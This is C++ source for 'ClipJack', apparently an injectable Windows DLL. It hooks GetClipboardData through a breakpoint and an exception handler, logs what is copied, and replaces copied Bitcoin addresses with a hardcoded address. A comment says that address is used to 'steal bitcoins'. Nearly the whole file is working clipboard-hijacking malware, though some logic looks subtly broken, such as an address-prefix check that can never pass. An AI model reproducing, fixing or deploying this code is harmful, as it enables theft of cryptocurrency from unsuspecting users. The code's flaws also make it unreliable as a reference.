#include "stdafx.h"
#include <string>

namespace Main
{
	using namespace std;

	uintptr_t user32GetClipboardData; //user32.DLL GetCLipboardData() address
	char BitcoinAddress[] = "1FeribRHR98Crux3DEZPXzjLBpfmHTHKqJ"; //Our address wich is used to steal bitcoins
	DWORD WINAPI Init(void* const(param))
	{
		AddVectoredExceptionHandler(1, vehHandler);
		AllocConsole();
		SetConsoleTitle(L"ClipJack Debug Console");
		FILE* stream;
		freopen_s(&stream, "CONOUT$", "w", stdout);

		//Kool Kids have fancy banners, so do we
		cout << "     ________  ___       ___  ________      ___  ________  ________  ___  __       " << endl;
		cout << "    |\\   ____\\|\\  \\     |\\  \\|\\   __  \\    |\\  \\|\\   __  \\|\\   ____\\|\\  \\|\\  \\     " << endl;
		cout << "    \\ \\  \\___|\\ \\  \\    \\ \\  \\ \\  \\|\\  \\   \\ \\  \\ \\  \\|\\  \\ \\  \\___|\\ \\  \\/  /|_   " << endl;
		cout << "     \\ \\  \\    \\ \\  \\    \\ \\  \\ \\   ____\\__ \\ \\  \\ \\   __  \\ \\  \\    \\ \\   ___  \\  " << endl;
		cout << "      \\ \\  \\____\\ \\  \\____\\ \\  \\ \\  \\___|\\  \\\\_\\  \\ \\  \\ \\  \\ \\  \\____\\ \\  \\\\ \\  \\ " << endl;
		cout << "       \\ \\_______\\ \\_______\\ \\__\\ \\__\\  \\ \\________\\ \\__\\ \\__\\ \\_______\\ \\__\\\\ \\__\\" << endl;
		cout << "        \\|_______|\\|_______|\\|__|\\|__|   \\|________|\\|__|\\|__|\\|_______|\\|__| \\|__|" << endl;
		cout << "             																				v2.0 by Ferib" << endl;

		user32GetClipboardData = (uintptr_t)GetProcAddress(GetModuleHandle(L"user32.dll"), "GetClipboardData");

		InjectHook(); //Write Software Breakpoints

		while (!GetAsyncKeyState(VK_F10) & 1)
		{
			//Using F10 will end this loop, wich means it will also unload the DLL
			Sleep(10); //Just added some delay or your CPU will be fucked
		}
		cout << "Unloading ClipJack..." << endl;
		FreeLibraryAndExitThread(static_cast<HMODULE>(param), NULL);
	}


	void WINAPI InjectHook()
	{
		DWORD dwOld;
		if (user32GetClipboardData != NULL) {
			VirtualProtect((LPVOID)(user32GetClipboardData + 0x12A), 1, PAGE_EXECUTE_READWRITE, &dwOld); //Should have PAGE_EXECUTE_READ
			*(BYTE*)(user32GetClipboardData) = 0xCC; //int 3
			VirtualProtect((LPVOID)(user32GetClipboardData + 0x12A), 1, dwOld, &dwOld);
		}
		else
			//just in case user32.DLL isn't in memory...
			cout << "Failed hooking GetClipboardData()" << endl;
		return;
	}

	LONG vehHandler(_EXCEPTION_POINTERS * exceptionInfo)
	{
		auto ctx = exceptionInfo->ContextRecord;	//Thread Context wich contains registers
		auto cer = exceptionInfo->ExceptionRecord;

		// WARNING:	user32GetClipboardData + 0x12A should point to the end of the function, wich is the RET instruction
		//			if the breakpoint gets placed on the wrong location, the application will crash from the moment
		//			that the function gets executed!

		//TODO: Scan for the offset to make sure its placed on the RET (0xC3) instruction

		if (ctx->Rip == (user32GetClipboardData + 0x12A) && (cer->ExceptionCode == STATUS_SINGLE_STEP || cer->ExceptionCode == STATUS_BREAKPOINT))
		{
			//restore instruction "ret"
			ctx->Rip = *(INT64*)(ctx->Rsp);	//place return address in RIP
			ctx->Rsp += 0x08;				//remove return address from stack

			//print pointer to string (wide char)
			cout << "0x" << hex << (*(INT64*)ctx->Rax) << ": ";

			//init some variables
			uintptr_t cptr = (*(uintptr_t*)ctx->Rax); //Rdx points to the string (wide chars array)
			char c = *(char*)(cptr);
			string msg = "";

			//Lets make a string, cuz thats easy to print isnt it?
			for (int i = 0; i <= 256; i += 2) {
				c = *(char*)(cptr + i);
				if (c == 0x00)
					break;
				msg += c;
			}
			cout << msg << endl; //Print the copy'd string in console

			//init some more variables
			bool IsMatch = true;
			int StringSize = 0;	//Bitcoin addresses are mostly 32 chars, and only contain "base58" characters

			//TODO: Define Base58 and filter out addresses that contain non-base58 characters

			//Quick Mafs to check if copy'd string is a bitcoin address
			for (int i = 0; i < sizeof(BitcoinAddress); i++) {
				if (*(char*)(cptr + (i * 2)) != 0x00) {
					StringSize++;
				}
				else {
					IsMatch = false;
					break;
				}
			}
			//Bitcoin address should always start with 1 or 3
			if (*(char*)(cptr) != '1' || *(char*)(cptr) != '3')
				IsMatch = false;

			//Time to overwrite the current address with our address in memory
			if (IsMatch) {
				for (int i = 0; i < sizeof(BitcoinAddress); i++) {
					if (*(char*)(cptr + (i * 2)) == 0x00) 
						break;
					*(char*)(cptr + (i * 2)) = BitcoinAddress[i]; //Remember its wide chars in memory
				}
			}

			return EXCEPTION_CONTINUE_EXECUTION;
		}
		else {
			//Might be good to know if there are some other software breakpoints triggering
			cout << "Unknown at 0x" << hex << ctx->Rip << " Rsp: 0x" << ctx->Rsp <<  endl;
		}
		return EXCEPTION_CONTINUE_SEARCH;
	}

}